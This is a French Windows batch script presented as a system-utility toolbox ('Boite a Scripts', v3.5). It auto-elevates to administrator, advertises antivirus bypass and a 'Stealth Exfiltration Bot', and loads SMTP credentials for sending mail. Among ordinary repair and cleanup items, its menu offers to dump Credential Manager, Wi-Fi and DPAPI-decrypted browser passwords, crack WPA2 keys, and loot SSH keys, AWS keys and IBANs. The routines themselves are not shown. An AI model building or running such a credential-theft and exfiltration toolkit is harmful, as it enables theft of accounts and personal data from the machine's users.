@echo off
setlocal EnableExtensions EnableDelayedExpansion
chcp 65001 >nul

REM --- CONFIGURATION DU REPERTOIRE ---
set "SCRIPT_DIR=%~dp0"
if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
cd /d "%SCRIPT_DIR%"

@echo off

REM === AUTO-ELEVATION EN ADMINISTRATEUR ===
fsutil dirty query %systemdrive% >nul 2>&1
if !errorlevel! neq 0 (
    cls
    echo   ▄▄▄▄▄▄▄ ▄▄       ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄    ▄▄       ▄▄▄▄▄▄▄    ▄▄▄▄▄▄  ▄▄▄▄▄▄▄ ▄▄   ▄▄ 
    echo  █       █  █     █       █       █  █ █  █  █  █     █       █  █      ██       █  █ █  █
    echo  █   ▄   █  █     █    ▄▄▄█    ▄▄▄█  █▄█  █  █  █     █    ▄▄▄█  █  ▄    █    ▄▄▄█  █▄█  █
    echo  █  █▄█  █  █     █   █▄▄▄█   █▄▄▄█       █  █  █     █   █▄▄▄   █ █ █   █   █▄▄▄█       █
    echo  █       █  █▄▄▄▄▄█    ▄▄▄█    ▄▄▄█       █  █  █▄▄▄▄▄█    ▄▄▄█  █ █▄█   █    ▄▄▄█       █
    echo  █   ▄   █       █   █▄▄▄█   █▄▄▄█   ▄   █  █       █   █▄▄▄   █       █   █▄▄▄█   ▄   █
    echo  █▄▄█ █▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█  █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█  █▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█
    echo.
    echo [ ! ] Elevation des privileges requise...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

set "SHOW_LOGO=1"

REM --- PARAMETRES DE LA FENETRE ---
title Boite a Scripts Windows - By ALEEXLEDEV (v3.5 GOLDEN EDITION)
mode con: cols=120 lines=60

:header
cls
echo   ▄▄▄▄▄▄▄ ▄▄       ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄    ▄▄       ▄▄▄▄▄▄▄    ▄▄▄▄▄▄  ▄▄▄▄▄▄▄ ▄▄   ▄▄ 
echo  █       █  █     █       █       █  █ █  █  █  █     █       █  █      ██       █  █ █  █
echo  █   ▄   █  █     █    ▄▄▄█    ▄▄▄█  █▄█  █  █  █     █    ▄▄▄█  █  ▄    █    ▄▄▄█  █▄█  █
echo  █  █▄█  █  █     █   █▄▄▄█   █▄▄▄█       █  █  █     █   █▄▄▄   █ █ █   █   █▄▄▄█       █
echo  █       █  █▄▄▄▄▄█    ▄▄▄█    ▄▄▄█       █  █  █▄▄▄▄▄█    ▄▄▄█  █ █▄█   █    ▄▄▄█       █
echo  █   ▄   █       █   █▄▄▄█   █▄▄▄█   ▄   █  █       █   █▄▄▄   █       █   █▄▄▄█   ▄   █
echo  █▄▄█ █▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█  █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█  █▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█
echo.
echo              ---===[  A  L  E  E  X     L  E     D  E  V  ]===---
echo.
echo     -------------------------------------------------------------------------------
echo     [+] VERSION : 3.5 GOLDEN EDITION            [+] BYPASS : ANTI-VIRUS LIVE
echo     [+] TARGET  : MULTI-NETWORK SCAN            [+] ACCESS : UNRESTRICTED
echo     -------------------------------------------------------------------------------
echo.

REM --- DETECTION MODE SANS ECHEC ---
if defined SAFEBOOT_OPTION goto header

REM --- INITIALISATION DES MODULES ---
echo %G%[ SYSTEM ]%N% Powering up framework...
set "CRED_FILE=%SCRIPT_DIR%\credentials.txt"
set "SMTP_USER="
set "SMTP_PASS="
set "EMAIL_TO="
if exist "%CRED_FILE%" (
    for /f "usebackq tokens=1,* delims==" %%A in ("%CRED_FILE%") do (
        if "%%A"=="SMTP_USER" set "SMTP_USER=%%B"
        if "%%A"=="SMTP_PASS" set "SMTP_PASS=%%B"
        if "%%A"=="EMAIL_TO"  set "EMAIL_TO=%%B"
    )
    echo [ MODULE ] Credentials base loaded.
) else (
    (echo SMTP_USER=& echo SMTP_PASS=& echo EMAIL_TO=) > "%CRED_FILE%"
)
echo [ MODULE ] Web-Exploit Database loaded.
echo [ MODULE ] Stealth Exfiltration Bot active.
echo.
echo [ i ] Initialisation terminee. Bienvenue, ALEEXLEDEV.

REM --- CONFIGURATION POWERSHELL ---
set "PSCMD=powershell"

REM --- CHARGEMENT DE LA BASE D'OUTILS ---

REM --- CHARGEMENT DE LA BASE D'OUTILS ---

set "t[1]=---:DIAGNOSTIC"
set "t[2]=sys_diagnostic_menu:Analyse et Diagnostic Systeme~Analyse par composant (Batterie, RAM, General, Disques...)"
set "t[3]=sys_report:Rapport Systeme~CPU, RAM, GPU, Stockage, Reseau:HIDDEN"
set "t[4]=sys_temp_report:Rapport de Temperature~Capteurs CPU et GPU:HIDDEN"
set "t[5]=sys_ram_check:Test de Memoire RAM~Analyse des barrettes:HIDDEN"
set "t[6]=sys_diag_network:Diagnostic Reseau~Ping, tracert, ports:HIDDEN"
set "t[7]=sys_battery_report:Rapport Batterie~Usure et autonomie:HIDDEN"
set "t[8]=sys_bitlocker_check:Etat BitLocker~Chiffrement des disques:HIDDEN"
set "t[9]=sys_event_log:Journal des Erreurs~Evenements critiques Windows:HIDDEN"
set "t[10]=sys_hw_test:Test Materiel~Processeur et memoire stress test:HIDDEN"
set "t[11]=sys_defender:Etat Windows Defender~Antivirus et protection:HIDDEN"
set "t[12]=ev_critical_24h:Erreurs Critiques 24h~Evenements systeme recents:HIDDEN"
set "t[13]=ev_critical_7d:Erreurs Critiques 7 jours~Historique des pannes:HIDDEN"
set "t[14]=ev_app_24h:Erreurs Applications 24h~Crash et exceptions:HIDDEN"
set "t[15]=ev_disk_warn:Alertes Disque~Avertissements SMART et disque:HIDDEN"
set "t[16]=---:REPARATION"
set "t[17]=sys_rescue_menu:Outil Reparation Windows (Rescue)~Menu multi-outils (SFC, DISM, CHKDSK, Reset WinUpdate...)"
set "t[18]=sys_repair_icons:Reparation Cache Icones~Corrige les icones/miniatures corrompues"
set "t[19]=sys_winre:Mode Reparation (WinRE)~Demarrer dans l'environnement de reparation Windows"
set "t[20]=res_sfc:SFC Scannow~Reparation des fichiers systeme:HIDDEN"
set "t[21]=res_dism_check:DISM CheckHealth~Verifier l'integrite de l'image:HIDDEN"
set "t[22]=res_dism_restore:DISM RestoreHealth~Restaurer l'image systeme:HIDDEN"
set "t[24]=res_chkdsk:CHKDSK~Reparer les erreurs disque:HIDDEN"
set "t[25]=res_wu_reset:Reset Windows Update~Reinitialiser les services MAJ:HIDDEN"
set "t[26]=res_explorer_restart:Redemarrer l'Explorateur~Sans redemarrer le PC:HIDDEN"
set "t[27]=res_gpu_reset:Reinitialiser le GPU~Win+Ctrl+Shift+B:HIDDEN"
set "t[28]=winre_boot:Redemarrer sur WinRE~Environnement de reparation:HIDDEN"
set "t[29]=winre_bios:Redemarrer vers le BIOS~Acces au firmware UEFI:HIDDEN"
set "t[30]=winre_bootmenu:Menu de demarrage~Choisir le peripherique:HIDDEN"
set "t[31]=winre_safe_minimal:Mode sans echec Minimal~Sans reseau ni ligne de cmd:HIDDEN"
set "t[32]=winre_safe_network:Mode sans echec Reseau~Avec pilotes reseau:HIDDEN"
set "t[33]=winre_safe_cmd:Mode sans echec Invite~Avec invite de commandes:HIDDEN"
set "t[34]=winre_nosign:Sans verification signatures~Pilotes non signes:HIDDEN"
set "t[35]=winre_status:Statut BCD actuel~Voir la configuration de demarrage:HIDDEN"
set "t[36]=winre_reset:Reinitialiser BCD~Restaurer le demarrage normal:HIDDEN"
set "t[90]=res_restore_point:Creer un Point de Restauration~Recommande avant toute reparation:HIDDEN"
set "t[174]=res_gpedit:Installer gpedit.msc~Editeur de strategie de groupe (Windows Home):HIDDEN"
set "t[37]=---:NETTOYAGE ET OPTIMISATION"
set "t[38]=sys_opti_menu:Nettoyeur et Optimiseur Systeme~Vider le cache, logs, et gagner en vitesse"
set "t[39]=sys_clean_unified:Nettoyage Complet Unifie~Temp, WU, DNS, disque...:HIDDEN"
set "t[40]=sys_registry_cleanup:Nettoyage du Registre~Cles orphelines:HIDDEN"
set "t[41]=sys_tweaks_menu:Optimisations Avancees~Telemetrie, Cortana, performance:HIDDEN"
set "t[42]=sys_startup_manager:Gestionnaire Demarrage~Programmes au boot Windows:HIDDEN"
set "t[43]=cl_temp:Vider les Temporaires~Fichiers temp utilisateur et systeme:HIDDEN"
set "t[44]=cl_wu:Purger Windows Update~Cache SoftwareDistribution:HIDDEN"
set "t[45]=cl_dns:Vider le cache DNS~ipconfig /flushdns:HIDDEN"
set "t[46]=cl_disk:Nettoyage Disque~cleanmgr compression:HIDDEN"
set "t[47]=cl_registry:Nettoyer le Registre~Cles orphelines:HIDDEN"
set "t[48]=cl_clipboard:Vider le Presse-papiers~Nettoyer les donnees copiees:HIDDEN"
set "t[23]=res_temp_clean:Nettoyage temp et SoftwareDistribution~Liberer de l'espace:HIDDEN"
set "t[127]=cl_all:Tout Nettoyer d'un coup~Nettoyage automatique complet:HIDDEN"
set "t[175]=res_clean_browsers:Nettoyer les caches navigateurs~Edge, Chrome, Firefox, Brave, Opera + miniatures:HIDDEN"
set "t[50]=---:RESEAU"
set "t[51]=dns_manager:Gestionnaire DNS~Changer DNS Cloudflare/Google"
set "t[52]=sys_network_menu:Menu de Depannage Reseau~Outils avances (DNS, ARP, TCP/IP)"
set "t[53]=net_cyber_menu:Scanner de failles et Pentest~Recherche de vulnerabilites Web et Reseau"
set "t[54]=show_dns_config:Affichage config DNS~Voir la configuration actuelle:HIDDEN"
set "t[55]=install_cloudflare_full:DNS Cloudflare~1.1.1.1 et 1.0.0.1:HIDDEN"
set "t[56]=install_google_full:DNS Google~8.8.8.8 et 8.8.4.4:HIDDEN"
set "t[57]=restore_dns:Restauration DNS DHCP~Par defaut:HIDDEN"
set "t[58]=net_flush_dns:Vider le cache DNS~ipconfig /flushdns:HIDDEN"
set "t[59]=net_display_dns:Afficher le cache DNS~ipconfig /displaydns:HIDDEN"
set "t[60]=net_clear_arp:Vider le cache ARP~arp -d *:HIDDEN"
set "t[61]=net_display_arp:Afficher la table ARP~arp -a:HIDDEN"
set "t[62]=net_renew_ip:Liberer et Renouveler l'IP~release / renew:HIDDEN"
set "t[63]=net_reset_tcpip:Reset TCP/IP Stack~netsh int ip reset:HIDDEN"
set "t[64]=net_reset_winsock:Reset Sockets Windows~netsh winsock reset:HIDDEN"
set "t[65]=net_reset_all:Reset Reseau Automatique~Flush DNS, Winsock, TCP/IP:HIDDEN"
set "t[66]=net_restart_adapters:Redemarrer les cartes reseau~Ethernet et Wi-Fi:HIDDEN"
set "t[67]=net_fast_reset:Script d'Urgence Reseau~7 commandes de depannage:HIDDEN"
set "t[68]=cyber_triage:Triage de Connectivite~Diagnostic rapide IP, Gateway et DNS:HIDDEN"
set "t[69]=cyber_adapter_audit:Audit des Adaptateurs Reseau~Infos MAC, vitesse et statut:HIDDEN"
set "t[70]=cyber_lan_auto:Scanner le Reseau Local (LAN)~Detecte les appareils connectes et leurs failles:HIDDEN"
set "t[71]=cyber_flux_analysis:Analyse des Flux Reseau~Ports ouverts et processus actifs:HIDDEN"
set "t[72]=cyber_dns_leak:Test de Fuite DNS~Verifier l'anonymat DNS avec VPN:HIDDEN"
set "t[73]=cyber_ip_grabber:Assistant Scanner Distant~Trouver l'IP et analyser la cible:HIDDEN"
set "t[129]=net_menu_wifi:Wi-Fi - Hors connexion~Recherche, audit et crack de reseaux Wi-Fi:HIDDEN"
set "t[130]=net_menu_interne:Reseau Interne - Connecte~Scanner LAN, flux, DNS, diagnostic local:HIDDEN"
set "t[131]=net_menu_distant:Reseau Distant~Scanner cible WAN, IP Grabber, post-exploitation:HIDDEN"
set "t[128]=cyber_exposure_audit:Audit d'Exposition des Donnees~Recherche fichiers sensibles:HIDDEN"
set "t[132]=cyber_wifi_audit:Analyseur Wi-Fi (Evil Twin)~Detection de faux points d'acces:HIDDEN"
set "t[151]=net_fast_discover:Scan de Presence LAN~IP, Nom, MAC et Constructeur de chaque hote:HIDDEN"
set "t[152]=net_web_hunt:Chasse aux Interfaces Web~Ports 80, 443, 8080, 8443 (Routeurs, NAS, Switchs):HIDDEN"
set "t[153]=net_service_enum:Enumeration des Services~SSH, Telnet, RDP, FTP, VNC, Imprimantes:HIDDEN"
set "t[154]=net_vuln_check:Verification des Failles~Partages C$ et acces Guest ouverts:HIDDEN"
set "t[156]=net_wifi_scan:Scan Reseaux Wi-Fi~Analyse des reseaux environnants (SSID, BSSID, signal, securite):HIDDEN"
set "t[157]=net_wifi_target:Analyser une Cible Wi-Fi~Informations detaillees sur un reseau selectionne:HIDDEN"
set "t[158]=net_wifi_crack:Cracker la Cle Wi-Fi~Profils sauvegardes + attaque dictionnaire WPA2-PSK:HIDDEN"
set "t[74]=---:DISQUE"
set "t[75]=disk_manager:Formatteur de Disque (DISKPART)~Formater un disque de facon securisee"
set "t[76]=---:APPLICATIONS"
set "t[77]=winget_manager:Mises a jour d'applications~Mettre a jour vos logiciels via Winget"
set "t[78]=app_installer:Installateur d'applications~Installer des logiciels par categorie"
set "t[79]=update_single:Mettre a jour une application~Choisir l'app via Winget:HIDDEN"
set "t[80]=update_all:Mettre a jour toutes les apps~winget upgrade --all:HIDDEN"
set "t[81]=app_install_chrome:Google Chrome~Navigateur web Google:HIDDEN"
set "t[82]=app_install_vlc:VLC Media Player~Lecteur multimedia:HIDDEN"
set "t[83]=app_install_pdf:Sumatra PDF~Lecteur PDF ultra-leger:HIDDEN"
set "t[84]=app_install_winrar:WinRAR~Gestionnaire d'archives:HIDDEN"
set "t[91]=app_install_office:Microsoft Office 2024~Telecharger Office 2024 via Google Drive:HIDDEN"
set "t[92]=app_install_ps7:PowerShell 7 (Vitesse++ )~Installer pour des menus ultra-rapides:HIDDEN"
set "t[85]=---:COMPTES ET SECURITE"
set "t[86]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Credentials, Wi-Fi)"
set "t[87]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle"
set "t[88]=um_menu:Gestion utilisateurs locaux~Panneau de gestion local (Admin, Pass, Ajouts)"
set "t[89]=sys_av_test:Test Antivirus (EICAR Safe)~Tester votre antivirus"
set "t[93]=dump_credman:Credential Manager~Extraire les identifiants Windows:HIDDEN"
set "t[94]=dump_wifi:Mots de passe Wi-Fi~Afficher ou exporter les SSID:HIDDEN"
set "t[95]=sys_nirsoft_pw:Extracteur Navigateurs (Nirsoft)~Ancienne methode:HIDDEN"
set "t[96]=wd_quick:Scan Rapide Defender~Analyse de securite rapide:HIDDEN"
set "t[97]=wd_full:Scan Complet Defender~Analyse totale du systeme:HIDDEN"
set "t[98]=wd_update:Mettre a jour Defender~Signatures de virus:HIDDEN"
set "t[99]=wd_threats:Voir les Menaces~Historique des virus detectes:HIDDEN"
set "t[100]=wd_status:Statut Defender~Protection active ou non:HIDDEN"
set "t[101]=av_launcher_eicar:Test EICAR Standard~Fichier de test antivirus officiel:HIDDEN"
set "t[102]=av_launcher_heur:Test Heuristique~Detection comportementale:HIDDEN"
set "t[103]=av_clean:Nettoyer les Fichiers Test~Supprimer les tests EICAR:HIDDEN"
set "t[104]=um_list:Lister les utilisateurs~Afficher tous les comptes locaux:HIDDEN"
set "t[105]=um_add:Ajouter un utilisateur~Creer un nouveau compte local:HIDDEN"
set "t[106]=um_del:Supprimer un utilisateur~Effacer compte et donnees:HIDDEN"
set "t[107]=um_admin:Gerer les droits~Passer standard ou administrateur:HIDDEN"
set "t[108]=um_reset:Ajouter/Modifier MDP~Changer mot de passe utilisateur:HIDDEN"
set "t[109]=um_remove_pwd:Supprimer le MDP (Auto-login)~Enlever le mot de passe:HIDDEN"
set "t[173]=um_superadmin:Super Administrateur (RID-500)~Activer ou desactiver le compte built-in:HIDDEN"
set "t[110]=---:EXTRACTION ET SAUVEGARDE"
set "t[111]=sys_export_menu:Recuperation de Donnees~Exporter les cles, mots de passe Wi-Fi et pilotes"
set "t[112]=sys_win_key:Cle Windows~Retrouver la cle de licence Windows:HIDDEN"
set "t[113]=sys_drivers:Export des Pilotes~Sauvegarde de tous les pilotes:HIDDEN"
set "t[114]=sys_export_software:Liste des Logiciels~Exporter via Winget:HIDDEN"
set "t[115]=sys_export_wifi_apps:Export Wi-Fi et Apps~Profils reseau et logiciels:HIDDEN"
set "t[155]=sys_loot_all:Extraction Finale LAN~Dump Wi-Fi, credentials et historique local:HIDDEN"
set "t[159]=dump_browser_local:Extracteur Navigateurs (Script)~Nouvelle methode avec decryptage DPAPI:HIDDEN"
set "t[161]=gather_browser_history:Analyse Historique Navigateurs~Detecte les URLs sensibles dans l'historique Chrome/Edge:HIDDEN"
set "t[162]=search_sensitive_docs:Scan Documents Critiques~Score de risque v5.5 - SSH, AWS, IBAN, mots de passe:HIDDEN"
set "t[163]=scan_web_routes:Audit Routes Web~Detecte .env, wp-config, /api, /admin exposes sur une URL:HIDDEN"
set "t[160]=Chrome, Edge - Dechiffrement DPAPI des identifiants et mots de passe:HIDDEN"
set "t[165]=---:PERSONNALISATION"
set "t[166]=context_menu:Menu contextuel Windows 11~Classic/Modern"
set "t[167]=sys_god_mode:Dossier God Mode~Raccourci ultime des parametres"
set "t[168]=sys_gaming_mode:Mode Gaming~Booster les perfs jeux"
set "t[169]=sys_shortcuts_bureau:Raccourcis Bureau 1-Clic~Redemarrer/Eteindre"
set "t[170]=activate_classic:Menu Contextuel Classique~Activer le menu classique Win10:HIDDEN"
set "t[171]=restore_modern:Menu Contextuel Moderne~Restaurer le menu Win11:HIDDEN"
set "t[172]=photo_viewer_toggle:Visionneuse Windows~Activer / Desactiver la Visionneuse de Photos"
set "t[116]=list_folder_menu:Lister et Rechercher~Outils d'arborescence et recherche par extensions"
set "t[124]=---:MATERIEL"
set "t[125]=touch_screen_manager:Gestionnaire Ecran Tactile~Activer/Desactiver"
set "t[126]=sys_print_manager:Gestionnaire d'Imprimantes~Lister/Vider le Spooler"
set "t[133]=hw_smart:Test SMART des Disques~Sante et duree de vie:HIDDEN"
set "t[134]=hw_winsat:Score WinSAT~Indice de performance Windows:HIDDEN"
set "t[135]=hw_ram_test:Test RAM (Windows)~Outil de diagnostic memoire:HIDDEN"
set "t[136]=hw_full_report:Rapport Materiel Complet~Tous les composants:HIDDEN"
set "t[137]=hw_all:Tous les Tests~Lancer tous les tests materiels:HIDDEN"
set "t[138]=touch_restart:Redemarrer le pilote tactile~Reset du service et peripherique:HIDDEN"
set "t[139]=touch_disable:Desactiver l'ecran tactile~Desactive le pilote HID tactile:HIDDEN"
set "t[140]=touch_enable:Activer l'ecran tactile~Reactive le pilote HID tactile:HIDDEN"
set "t[141]=print_list:Lister les imprimantes~Affiche toutes les imprimantes:HIDDEN"
set "t[142]=print_clear_queue:Vider la file d'attente~Supprime les jobs bloques:HIDDEN"
set "t[143]=print_remove:Supprimer une imprimante~Retirer une imprimante installee:HIDDEN"
set "t[144]=print_restart_spooler:Redemarrer le Spooler~Relance le service d'impression:HIDDEN"
set "t[49]=sys_power_plan:Gestionnaire Plan d'Alimentation~Equilibre/Performances"
set "t[145]=pp_balanced:Plan Equilibre~Usage quotidien (batterie + perf):HIDDEN"
set "t[146]=pp_saver:Plan Economies d'Energie~Autonomie maximale:HIDDEN"
set "t[147]=pp_high:Plan Hautes Performances~Maximum de puissance:HIDDEN"
set "t[148]=pp_ultimate:Plan Performances Ultimes~Plan secret Windows:HIDDEN"
set "t[149]=pp_current:Voir le Plan Actuel~Afficher le plan d'alimentation:HIDDEN"
set "t[150]=pp_list:Lister tous les Plans~Tous les plans disponibles:HIDDEN"
set "t[176]=sys_battery_status:Statut Batterie en Direct~Niveau de charge, alimentation et tension:HIDDEN"
set "t[177]=sys_battery_energy:Audit Energetique Windows~Diagnostic autonomie et veille (powercfg):HIDDEN"
set "t[178]=sys_ram_usage:Consommation RAM en Direct~Usage memoire et Top processus:HIDDEN"
REM Auto-detection du nombre de scripts (plus besoin de mettre a jour manuellement)
set "total_tools=0"
for /l %%I in (1,1,500) do if defined t[%%I] set "total_tools=%%I"

REM --- TABLE DE MAPPING CATEGORIE -> MODULE (pour futur split en fichiers) ---
set "_mod_DIAGNOSTIC=diagnostic"
set "_mod_REPARATION=reparation"
set "_mod_NETTOYAGE=nettoyage"
set "_mod_RESEAU=reseau"
set "_mod_DISQUE=disque"
set "_mod_APPLICATIONS=applications"
set "_mod_COMPTES=comptes_securite"
set "_mod_EXTRACTION=extraction"
set "_mod_PERSONNALISATION=personnalisation"
set "_mod_MATERIEL=materiel"
REM --- NOMS D'AFFICHAGE POUR AutoMenu (map_label) ---
set "map_touch_restart=Redemarrer le pilote tactile~Reset du service et peripherique"
set "map_touch_disable=Desactiver l'ecran tactile~Desactive le pilote HID tactile"
set "map_touch_enable=Activer l'ecran tactile~Reactive le pilote HID tactile"
set "map_print_list=Lister les imprimantes~Affiche toutes les imprimantes"
set "map_print_clear_queue=Vider la file d'attente~Supprime les jobs bloques"
set "map_print_remove=Supprimer une imprimante~Retirer une imprimante installee"
set "map_print_restart_spooler=Redemarrer le Spooler~Relance le service d'impression"
set "map_pp_balanced=Plan Equilibre~Usage quotidien (batterie + perf)"
set "map_pp_saver=Plan Economies d'Energie~Autonomie maximale"
set "map_pp_high=Plan Hautes Performances~Maximum de puissance"
set "map_pp_ultimate=Plan Performances Ultimes~Plan secret Windows"
set "map_pp_current=Voir le Plan Actuel~Afficher le plan d'alimentation"
set "map_pp_list=Lister tous les Plans~Tous les plans disponibles"
set "map_activate_classic=Menu Contextuel Classique~Activer le menu classique Win10"
set "map_restore_modern=Menu Contextuel Moderne~Restaurer le menu Win11"
set "map_update_single=Mettre a jour une application~Choisir l'app via Winget"
set "map_update_all=Mettre a jour toutes les apps~winget upgrade --all"
set "map_sys_report=Rapport Systeme~CPU, RAM, GPU, Stockage, Reseau"
set "map_sys_temp_report=Rapport de Temperature~Capteurs CPU et GPU"
set "map_sys_ram_check=Test de Memoire RAM~Analyse des barrettes"
set "map_sys_ram_usage=Consommation RAM en Direct~Usage memoire et Top processus"
set "map_sys_diag_network=Diagnostic Reseau~Ping, tracert, ports"
set "map_sys_battery_report=Rapport Batterie~Usure et autonomie"
set "map_sys_battery_status=Statut Batterie en Direct~Niveau de charge, alimentation et tension"
set "map_sys_battery_energy=Audit Energetique Windows~Diagnostic autonomie et veille (powercfg)"
set "map_sys_bitlocker_check=Etat BitLocker~Chiffrement des disques"
set "map_sys_event_log=Journal des Erreurs~Evenements critiques Windows"
set "map_sys_hw_test=Test Materiel~Processeur et memoire stress test"
set "map_sys_defender=Etat Windows Defender~Antivirus et protection"
set "map_res_sfc=SFC Scannow~Reparation des fichiers systeme"
set "map_res_dism_check=DISM CheckHealth~Verifier l'integrite de l'image"
set "map_res_dism_restore=DISM RestoreHealth~Restaurer l'image systeme"
set "map_res_temp_clean=Nettoyage temp et SoftwareDistribution~Liberer de l'espace"
set "map_res_chkdsk=CHKDSK~Reparer les erreurs disque"
set "map_res_wu_reset=Reset Windows Update~Reinitialiser les services MAJ"
set "map_res_explorer_restart=Redemarrer l'Explorateur~Sans redemarrer le PC"
set "map_res_gpu_reset=Reinitialiser le GPU~Win+Ctrl+Shift+B"
set "map_res_restore_point=Creer un Point de Restauration~Recommande avant toute reparation"
set "map_dump_credman=Credential Manager~Extraire les identifiants Windows"
set "map_dump_wifi=Mots de passe Wi-Fi~Afficher ou exporter les SSID"
set "map_sys_nirsoft_pw=Extracteur Navigateurs (Nirsoft)~Ancienne methode"
set "map_dump_browser_local=Extracteur Navigateurs (Script)~Nouvelle methode avec decryptage DPAPI"
set "map_gather_browser_history=Analyse Historique Navigateurs~Detecte les URLs sensibles dans l'historique Chrome/Edge"
set "map_search_sensitive_docs=Recherche Documents Sensibles~Factures, RIB, Contrats, Mots de passe sur le PC"
set "map_scan_web_routes=Audit Routes Web~.env, wp-config, /api, /admin, /graphql, backups, logs"
set "map_sys_win_key=Cle Windows~Retrouver la cle de licence Windows"
set "map_sys_drivers=Export des Pilotes~Sauvegarde de tous les pilotes"
set "map_sys_export_software=Liste des Logiciels~Exporter via Winget"
set "map_sys_export_wifi_apps=Export Wi-Fi et Apps~Profils reseau et logiciels"
set "map_hw_smart=Test SMART des Disques~Sante et duree de vie"
set "map_hw_winsat=Score WinSAT~Indice de performance Windows"
set "map_hw_ram_test=Test RAM (Windows)~Outil de diagnostic memoire"
set "map_hw_full_report=Rapport Materiel Complet~Tous les composants"
set "map_hw_all=Tous les Tests~Lancer tous les tests materiels"
set "map_ev_critical_24h=Erreurs Critiques 24h~Evenements systeme recents"
set "map_ev_critical_7d=Erreurs Critiques 7 jours~Historique des pannes"
set "map_ev_app_24h=Erreurs Applications 24h~Crash et exceptions"
set "map_ev_disk_warn=Alertes Disque~Avertissements SMART et disque"
set "map_winre_boot=Redemarrer sur WinRE~Environnement de reparation"
set "map_winre_bios=Redemarrer vers le BIOS~Acces au firmware UEFI"
set "map_winre_bootmenu=Menu de demarrage~Choisir le peripherique"
set "map_winre_safe_minimal=Mode sans echec Minimal~Sans reseau ni ligne de cmd"
set "map_winre_safe_network=Mode sans echec Reseau~Avec pilotes reseau"
set "map_winre_safe_cmd=Mode sans echec Invite~Avec invite de commandes"
set "map_winre_nosign=Sans verification signatures~Pilotes non signes"
set "map_winre_status=Statut BCD actuel~Voir la configuration de demarrage"
set "map_winre_reset=Reinitialiser BCD~Restaurer le demarrage normal"
set "map_wd_quick=Scan Rapide Defender~Analyse de securite rapide"
set "map_wd_full=Scan Complet Defender~Analyse totale du systeme"
set "map_wd_update=Mettre a jour Defender~Signatures de virus"
set "map_wd_threats=Voir les Menaces~Historique des virus detectes"
set "map_wd_status=Statut Defender~Protection active ou non"
set "map_sys_clean_unified=Nettoyage Complet Unifie~Temp, WU, DNS, disque..."
set "map_sys_registry_cleanup=Nettoyage du Registre~Cles orphelines"
set "map_sys_tweaks_menu=Optimisations Avancees~Telemetrie, Cortana, performance"
set "map_sys_startup_manager=Gestionnaire Demarrage~Programmes au boot Windows"
set "map_cl_temp=Vider les Temporaires~Fichiers temp utilisateur et systeme"
set "map_cl_wu=Purger Windows Update~Cache SoftwareDistribution"
set "map_cl_dns=Vider le cache DNS~ipconfig /flushdns"
set "map_cl_disk=Nettoyage Disque~cleanmgr compression"
set "map_cl_registry=Nettoyer le Registre~Cles orphelines"
set "map_cl_clipboard=Vider le Presse-papiers~Nettoyer les donnees copiees"
set "map_cl_all=Tout Nettoyer d'un coup~Nettoyage automatique complet"
set "map_av_launcher_eicar=Test EICAR Standard~Fichier de test antivirus officiel"
set "map_av_launcher_heur=Test Heuristique~Detection comportementale"
set "map_av_clean=Nettoyer les Fichiers Test~Supprimer les tests EICAR"
set "map_app_install_chrome=Google Chrome~Navigateur web Google"
set "map_app_install_vlc=VLC Media Player~Lecteur multimedia"
set "map_app_install_pdf=Sumatra PDF~Lecteur PDF ultra-leger"
set "map_app_install_winrar=WinRAR~Gestionnaire d'archives"
set "map_app_install_office=Microsoft Office 2024~Telecharger Office 2024 (7 Go) via Google Drive"
set "map_um_list=Lister les utilisateurs~Afficher tous les comptes locaux"
set "map_um_add=Ajouter un utilisateur~Creer un nouveau compte local"
set "map_um_del=Supprimer un utilisateur~Effacer compte et donnees"
set "map_um_admin=Gerer les droits~Passer standard ou administrateur"
set "map_um_reset=Ajouter/Modifier MDP~Changer mot de passe utilisateur"
set "map_um_remove_pwd=Supprimer le MDP (Auto-login)~Enlever le mot de passe"
set "map_um_superadmin=Super Administrateur (RID-500)~Activer ou desactiver le compte built-in"
set "map_res_gpedit=Installer gpedit.msc~Editeur de strategie de groupe (Windows Home)"
set "map_res_clean_browsers=Nettoyer les caches navigateurs~Edge, Chrome, Firefox, Brave, Opera + miniatures"
set "map_cyber_triage=Diagnostic PC et Connectivite~Analyse IP, Cartes reseau (MAC), DNS et Gateway"

set "map_cyber_lan_auto=Scanner Reseau Local (LAN)~Scan des adresses locales pour detecter les appareils connectes"
set "map_cyber_flux_analysis=Analyse des Flux Reseau~Ports ouverts et processus actifs"
set "map_cyber_dns_leak=Test de Fuite DNS~Verifier l'anonymat DNS avec VPN"
set "map_cyber_ip_grabber=Assistant Scanner Distant~Trouver l'IP et analyser la cible"
set "map_cyber_wifi_audit=Analyseur Wi-Fi (Evil Twin)~Detection de faux points d'acces"
set "map_net_menu_wifi=Wi-Fi - Hors connexion~Recherche, audit et crack de reseaux Wi-Fi"
set "map_net_menu_interne=Reseau Interne - Connecte~Scanner LAN, flux, DNS, diagnostic local"
set "map_net_menu_distant=Reseau Distant~Scanner cible WAN, IP Grabber, post-exploitation"
set "map_net_fast_discover=Scan de Presence LAN~Detecte IP, Nom, MAC et Constructeur de chaque machine"
set "map_net_web_hunt=Chasse aux Interfaces Web~Ports 80, 443, 8080, 8443 - Routeurs, NAS, Switchs"
set "map_net_service_enum=Enumeration des Services~SSH, Telnet, RDP, FTP, VNC, Imprimantes detectes"
set "map_net_vuln_check=Verification des Failles~Partages C$ et acces Guest ouverts"
set "map_sys_loot_all=Extraction Finale LAN~Dump credentials, Wi-Fi, historique navigateurs"
set "map_cyber_exposure_audit=Audit d'Exposition des Donnees~Recherche de fichiers sensibles"
set "map_show_dns_config=Affichage Config DNS~Voir la configuration actuelle"
